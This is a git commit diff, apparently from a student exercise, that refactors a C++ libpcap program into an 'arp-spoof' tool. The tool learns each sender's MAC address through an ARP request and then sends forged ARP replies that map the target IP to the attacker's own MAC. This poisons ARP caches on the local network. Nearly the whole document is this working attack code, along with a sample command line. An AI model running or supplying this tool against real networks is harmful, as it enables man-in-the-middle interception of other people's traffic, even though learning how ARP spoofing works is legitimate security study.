aee7b0e0da7987838f2560d954bd7039da6e47e2
jzzzziqw <jzero085@naver.com>
2024-08-21 02:54:33 +0000

    test

--- README.md
+++
@@ -1,3 +0,0 @@
-![image](https://github.com/user-attachments/assets/b5d6af96-3bf7-4260-8f1d-72524246730d)
-![image](https://github.com/user-attachments/assets/5c334f1f-a114-45a0-b9db-94032db06a2e)
-![image](https://github.com/user-attachments/assets/79b9660d-aa67-4e0a-80a8-b3269ee255fa)
--- main.cpp
+++ main.cpp
@@ -1,200 +1,208 @@
-#include <cstdio>   // 표준 입출력 사용을 위한 헤더 파일
-#include <pcap.h>   // pcap 라이브러리 사용을 위한 헤더 파일
-#include "ethhdr.h" // Ethernet 헤더 구조체를 정의한 커스텀 헤더 파일
-#include "arphdr.h" // ARP 헤더 구조체를 정의한 커스텀 헤더 파일
-#include <string>   // 문자열 처리를 위한 헤더 파일
-#include <net/if.h> // 네트워크 인터페이스 관련 구조체를 위한 헤더 파일
-#include <sys/ioctl.h> // 입출력 제어를 위한 헤더 파일
-#include <arpa/inet.h> // IP 주소 변환을 위한 헤더 파일
-#include <unistd.h> // 시스템 호출을 위한 헤더 파일
-#include <vector> // 벡터 자료구조 사용을 위한 헤더 파일
+#include <iostream> // std, namespace 사용
+#include <stdexcept>
+#include <array>
+#include <cstdio>
+#include <pcap.h>
+#include <string>
+#include <vector>
+#include <net/if.h>
+#include <sys/ioctl.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <cstring>
+#include "ethhdr.h"
+#include "arphdr.h"
 
-// 구조체의 메모리 정렬을 1바이트로 설정 (패딩 방지)
 #pragma pack(push, 1)
-
-// 이더넷 + ARP 패킷 구조체 정의
 struct EthArpPacket final {
-	EthHdr eth_; // 이더넷 헤더
-	ArpHdr arp_; // ARP 헤더
+    EthHdr eth_;
+    ArpHdr arp_;
 };
+#pragma pack(pop)
 
-#pragma pack(pop) // 메모리 정렬을 기본값으로 복원
-
-// 프로그램 사용법을 출력하는 함수
+/* 사용법 출력 */
 void usage() {
-	printf("syntax: send-arp-test <interface>\n");
-	printf("sample: send-arp-test wlan0\n");
+    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip2>...]\n");
+    printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
 
-// fd는 file descriptor
-char* get_mac_address(const char* iface) {
-    int fd;
-    struct ifreq ifr;
-    char* mac_addr = (char*)malloc(18);  // 반환할 MAC 주소를 저장할 동적 메모리 할당
-    if (mac_addr == NULL) {
-        perror("메모리 할당 실패");
-        exit(EXIT_FAILURE);
+using namespace std; // 를 생략할 수 있게 해준다
+
+/* 네트워크 인터페이스 'iface'의 MAC 주소를 가져옴 */
+//멘토님 피드백 - MAC 주소를 가져와 문자열로 변환 후 다시 MAC 클래스 객체로 변환하는 과정은 불필요하다.
+
+array<unsigned char, 6> get_mac_address(const string& iface) {
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if(fd == -1) {
+        throw runtime_error("소켓 생성 실패");
     }
 
-    fd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (fd == -1) {
-        perror("socket 생성 실패");
-        free(mac_addr);  // 메모리 해제
-        exit(EXIT_FAILURE);
-    }
-
-    ifr.ifr_addr.sa_family = AF_INET;
-    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
+    struct ifreq ifr = {};
+    strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ -1);
+    ifr.ifr_name[IFNAMSIZ -1] = '\0';
+    /* memset 대신에 구조체 선언과 초기화를 동시에 할 수 있음
+       strncpy는 제한된 문자 길이만큼의 데이터가 삽입될 경우 
+       공백 문자가 들어가지 않을 수 있기 때문에 명시적으로 공백 문자를 넣어준다. */
 
     if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
-        perror("ioctl 요청 실패");
         close(fd);
-        free(mac_addr);  // 메모리 해제
-        exit(EXIT_FAILURE);
+        throw runtime_error("IOCTL 요청 실패");
     }
 
     close(fd);
+    
+    /* static_cast - 타입 변환을 안전하게 수행 */
+    array<unsigned char, 6> mac_address = {
+        static_cast<unsigned char>(ifr.ifr_hwaddr.sa_data[0]),
+        static_cast<unsigned char>(ifr.ifr_hwaddr.sa_data[1]),
+        static_cast<unsigned char>(ifr.ifr_hwaddr.sa_data[2]),
+        static_cast<unsigned char>(ifr.ifr_hwaddr.sa_data[3]),
+        static_cast<unsigned char>(ifr.ifr_hwaddr.sa_data[4]),
+        static_cast<unsigned char>(ifr.ifr_hwaddr.sa_data[5])
+    };
 
-    // MAC 주소를 문자열로 변환
-    snprintf(mac_addr, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
-             (unsigned char)ifr.ifr_hwaddr.sa_data[0],
-             (unsigned char)ifr.ifr_hwaddr.sa_data[1],
-             (unsigned char)ifr.ifr_hwaddr.sa_data[2],
-             (unsigned char)ifr.ifr_hwaddr.sa_data[3],
-             (unsigned char)ifr.ifr_hwaddr.sa_data[4],
-             (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
-
-    return mac_addr;  // 동적 메모리의 주소 반환
+    return mac_address;
 }
 
-char* get_ip_address(const char* iface) {
-    int fd;
-    struct ifreq ifr;
-    char* ip_str = (char*)malloc(INET_ADDRSTRLEN); // IP 주소를 저장할 동적 메모리 할당
-    if (ip_str == NULL) {
-        perror("메모리 할당 실패");
-        exit(EXIT_FAILURE);
+array<unsigned char, 4> get_ip_address(const string& iface) {
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if(fd == -1) {
+        throw runtime_error("소켓 생성 실패");
     }
 
-    fd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (fd == -1) {
-        perror("socket 생성 실패");
-        free(ip_str);  // 메모리 해제
-        exit(EXIT_FAILURE);
-    }
-
+    struct ifreq ifr = {};
     ifr.ifr_addr.sa_family = AF_INET;
-    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
+    strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ -1);
+    ifr.ifr_name[IFNAMSIZ -1] = '\0';
 
-    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
-        perror("ioctl 요청 실패");
+    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {  // 여기서 SIOCGIFADDR 사용
         close(fd);
-        free(ip_str);  // 메모리 해제
-        exit(EXIT_FAILURE);
+        throw runtime_error("IOCTL 요청 실패");
     }
 
     close(fd);
 
-    // IP 주소를 문자열로 변환
-    inet_ntop(AF_INET, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), ip_str, INET_ADDRSTRLEN);
+    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
 
-    return ip_str;  // 동적 메모리의 주소 반환
+    array<unsigned char, 4> ip_address = {
+        static_cast<unsigned char>(ipaddr->sin_addr.s_addr & 0xFF),
+        static_cast<unsigned char>((ipaddr->sin_addr.s_addr >> 8) & 0xFF),
+        static_cast<unsigned char>((ipaddr->sin_addr.s_addr >> 16) & 0xFF),
+        static_cast<unsigned char>((ipaddr->sin_addr.s_addr >> 24) & 0xFF)
+    };
+
+    return ip_address;
 }
 
-// 메인 함수
-int main(int argc, char* argv[]) {
-    if (argc < 4 || (argc % 2) != 0) {
-        usage();
-        return -1;
-    }
 
-    char* dev = argv[1];
-    std::vector<Ip> sender_ips;
-    std::vector<Ip> target_ips;
-
-    for (int i = 2; i < argc; i += 2) {
-        sender_ips.push_back(Ip(argv[i]));
-        target_ips.push_back(Ip(argv[i + 1]));
-    }
-
-    // 에러 메시지를 저장할 버퍼
-    char errbuf[PCAP_ERRBUF_SIZE];
-    // 장치를 열어 라이브 패킷 캡처를 시작
-    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
-    if (handle == nullptr) {
-        // 장치를 열 수 없으면 에러 메시지를 출력하고 종료
-        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-        return -1;
-    }
-
-    // ARP 패킷 구조체 생성
+void send_arp_request(pcap_t* handle, Mac my_mac, Ip my_ip, Ip target_ip) {
     EthArpPacket packet;
+    
+    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
+    packet.eth_.smac_ = my_mac;
+    packet.eth_.type_ = htons(EthHdr::Arp);
 
-    std::string my_mac_str = get_mac_address(dev);
-    std::string my_ip_str = get_ip_address(dev);
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ = Ip::SIZE;
+    packet.arp_.op_ = htons(ArpHdr::Request);
+    packet.arp_.smac_ = my_mac;
+    packet.arp_.sip_ = htonl(my_ip);
+    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+    packet.arp_.tip_ = htonl(target_ip);
 
-    Mac my_mac(my_mac_str.c_str());
-    Ip my_ip(my_ip_str.c_str());
+    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) != 0) {
+        throw runtime_error("ARP 요청 송신 실패: " + string(pcap_geterr(handle)));
+    }
+}
 
-    int res;
-
-    // 패킷을 네트워크로 전송
-    for (size_t i = 0; i < sender_ips.size(); ++i) {
-        EthArpPacket packet;
-        packet = EthArpPacket{
-            .eth_ = EthHdr{ Mac("ff:ff:ff:ff:ff:ff"), my_mac, htons(EthHdr::Arp) },
-            .arp_ = ArpHdr{
-                htons(ArpHdr::ETHER),
-                htons(EthHdr::Ip4),
-                Mac::SIZE,
-                Ip::SIZE,
-                htons(ArpHdr::Request),
-                my_mac,
-                htonl(my_ip),
-                Mac("00:00:00:00:00:00"),
-                htonl(sender_ips[i])
-            }
-        };
-
-        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-        if (res != 0) {
-            fprintf(stderr, "Error sending ARP request: %d (%s)\n", res, pcap_geterr(handle));
-            pcap_close(handle);
-            return -1;
+Mac get_mac_from_reply(pcap_t* handle, const Ip& sender_ip) {
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char* recv_packet;
+        int res = pcap_next_ex(handle, &header, &recv_packet);
+        if (res == 0) continue;
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+            throw runtime_error("패킷 캡쳐 실패: " + string(pcap_geterr(handle)));
         }
 
-        while (true) {
-            struct pcap_pkthdr* header;
-            const u_char* recv_packet;
-            res = pcap_next_ex(handle, &header, &recv_packet);
-            if (res == 0) continue;
-            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-                printf("Error capturing packet: %s\n", pcap_geterr(handle));
-                break;
+        EthArpPacket* recv_etharp = (EthArpPacket*)recv_packet;
+        if (recv_etharp->eth_.type_ == htons(EthHdr::Arp) && recv_etharp->arp_.op_ == htons(ArpHdr::Reply)) {
+            if (recv_etharp->arp_.sip() == sender_ip) {
+                return recv_etharp->eth_.smac();
             }
-
-            EthArpPacket* recv_etharp = (EthArpPacket*)recv_packet;
-            if (recv_etharp->eth_.type_ == htons(EthHdr::Arp) && recv_etharp->arp_.op_ == htons(ArpHdr::Reply)) {
-                if (recv_etharp->arp_.sip() == sender_ips[i]) {
-                    printf("Sender's MAC: %s\n", std::string(recv_etharp->eth_.smac()).c_str());
-                    packet.eth_.dmac_ = recv_etharp->eth_.smac_;
-                    packet.arp_.tmac_ = recv_etharp->eth_.smac_;
-                    break;
-                }
-            }
-        }
-
-        packet.arp_.op_ = htons(ArpHdr::Reply);
-        packet.arp_.sip_ = htonl(target_ips[i]);
-        packet.arp_.tip_ = htonl(sender_ips[i]);
-
-        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-        if (res != 0) {
-            fprintf(stderr, "Error sending ARP reply: %d (%s)\n", res, pcap_geterr(handle));
         }
     }
+}
 
-    // 네트워크 장치 핸들 닫기
-    pcap_close(handle);
-    return 0;
+void send_arp_reply(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, const Mac& target_mac, const Ip& sender_ip, const Ip& target_ip) {
+    EthArpPacket packet;
+    packet.eth_.dmac_ = target_mac;
+    packet.eth_.smac_ = my_mac;
+    packet.eth_.type_ = htons(EthHdr::Arp);
+
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ = Ip::SIZE;
+    packet.arp_.op_ = htons(ArpHdr::Reply);
+    packet.arp_.smac_ = my_mac;
+    packet.arp_.sip_ = htonl(target_ip);
+    packet.arp_.tmac_ = target_mac;
+    packet.arp_.tip_ = htonl(sender_ip);
+
+    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) != 0) {
+        throw runtime_error("ARP 응답 송신 실패: " + string(pcap_geterr(handle)));
+    }
+}
+
+int main(int argc, char* argv[]) {
+    try {
+        if (argc < 4 || (argc % 2) != 0) {
+            usage();
+            return EXIT_FAILURE;
+        }
+
+        string dev = argv[1];
+        vector<Ip> sender_ips;
+        vector<Ip> target_ips;
+
+        for (int i = 2; i < argc; i += 2) {
+            sender_ips.emplace_back(argv[i]);
+            target_ips.emplace_back(argv[i + 1]);
+        }
+
+        Mac my_mac(get_mac_address(dev).data());
+
+        // 하... 처음부터 uint로 받을걸
+        array<unsigned char, 4> my_ip_array = get_ip_address(dev);
+        uint32_t my_ip_uint = 
+            (static_cast<uint32_t>(my_ip_array[0]) << 24) |
+            (static_cast<uint32_t>(my_ip_array[1]) << 16) |
+            (static_cast<uint32_t>(my_ip_array[2]) << 8)  |
+            static_cast<uint32_t>(my_ip_array[3]);
+
+        Ip my_ip(my_ip_uint);
+
+        char errbuf[PCAP_ERRBUF_SIZE];
+        pcap_t* handle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
+        if (handle == nullptr) {
+            throw runtime_error("Couldn't open device " + dev + " (" + errbuf + ")");
+        }
+
+        for (size_t i = 0; i < sender_ips.size(); ++i) {
+            send_arp_request(handle, my_mac, my_ip, sender_ips[i]);
+            Mac sender_mac = get_mac_from_reply(handle, sender_ips[i]);
+
+            send_arp_reply(handle, my_mac, my_ip, sender_mac, sender_ips[i], target_ips[i]);
+        }
+
+        pcap_close(handle);
+    } catch (const exception& ex) {
+        cerr << "Error: " << ex.what() << endl;
+        return EXIT_FAILURE;
+    }
+
+    return EXIT_SUCCESS;
 }
